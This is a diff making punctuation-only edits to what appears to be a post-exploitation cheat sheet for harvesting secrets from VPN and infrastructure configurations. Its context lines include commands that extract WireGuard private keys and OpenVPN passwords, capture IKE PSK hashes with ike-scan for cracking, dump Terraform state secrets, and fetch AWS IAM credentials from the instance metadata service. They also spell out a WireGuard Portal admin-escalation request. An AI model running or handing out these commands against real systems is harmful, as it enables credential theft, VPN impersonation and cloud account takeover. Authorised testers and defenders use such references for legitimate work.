@@ -18,7 +18,7 @@ find / -name 'wg*.conf' 2>/dev/null
 
 **What to extract:**
 ```bash
-# Private key (the crown jewel -- full VPN impersonation)
+# Private key (the crown jewel - full VPN impersonation)
 grep PrivateKey /etc/wireguard/*.conf 2>/dev/null
 
 # Pre-shared keys (additional layer)
@@ -44,7 +44,7 @@ ip link show type wireguard 2>/dev/null
 - Check `PreUp`/`PostUp`/`PreDown`/`PostDown` scripts for writable paths (code injection)
 
 **Recent CVEs:**
-- CVE-2026-27899: WireGuard Portal privilege escalation -- any authenticated user can become admin via `PUT /api/v1/users/me` with `"IsAdmin": true` (fixed in v2.1.3)
+- CVE-2026-27899: WireGuard Portal privilege escalation - any authenticated user can become admin via `PUT /api/v1/users/me` with `"IsAdmin": true` (fixed in v2.1.3)
 - CVE-2026-29196: Netmaker API exposes WireGuard private keys to low-privileged users (fixed in v1.5.0)
 
 ---
@@ -70,7 +70,7 @@ grep -E 'ca |cert |key |tls-auth|tls-crypt' /etc/openvpn/*.conf 2>/dev/null
 
 # Credential files (auth-user-pass <file>)
 grep 'auth-user-pass' /etc/openvpn/*.conf 2>/dev/null
-# Then read the referenced file -- contains username on line 1, password on line 2
+# Then read the referenced file - contains username on line 1, password on line 2
 
 # Management interface (often localhost:7505, no auth by default)
 grep 'management' /etc/openvpn/*.conf 2>/dev/null
@@ -128,7 +128,7 @@ grep -E 'left=|right=|leftsubnet|rightsubnet' /etc/ipsec.conf 2>/dev/null
 # Discover IKE service and supported transforms
 ike-scan TARGET_IP
 
-# Aggressive mode -- captures PSK hash for offline cracking
+# Aggressive mode - captures PSK hash for offline cracking
 ike-scan -A -n GROUP_NAME TARGET_IP
 # The response contains a hash that can be cracked with:
 
@@ -194,7 +194,7 @@ ssh -J user@pivot1,user@pivot2 user@final_target
 
 ### Terraform State Files
 
-Terraform state contains every secret in plaintext -- database passwords, API keys, TLS certs,
+Terraform state contains every secret in plaintext - database passwords, API keys, TLS certs,
 cloud credentials. This is a known limitation with no first-class fix (open issue for 6+ years).
 
 ```bash
@@ -214,7 +214,7 @@ env | grep -i TF_VAR_
 ```
 
 **What you get:** database passwords, cloud API keys, TLS private keys, any `sensitive = true`
-variable (still stored in state -- the flag only hides it from plan output).
+variable (still stored in state - the flag only hides it from plan output).
 
 ### Ansible Vault Cracking
 
@@ -259,12 +259,12 @@ grep 'vault_password_file' /path/to/ansible.cfg 2>/dev/null
 Accessible from any process on a cloud VM or k8s pod (unless explicitly blocked).
 
 ```bash
-# AWS (IMDSv1 -- no auth needed)
+# AWS (IMDSv1 - no auth needed)
 curl -s http://169.254.169.254/latest/meta-data/
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
 
-# AWS (IMDSv2 -- needs token header)
+# AWS (IMDSv2 - needs token header)
 TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
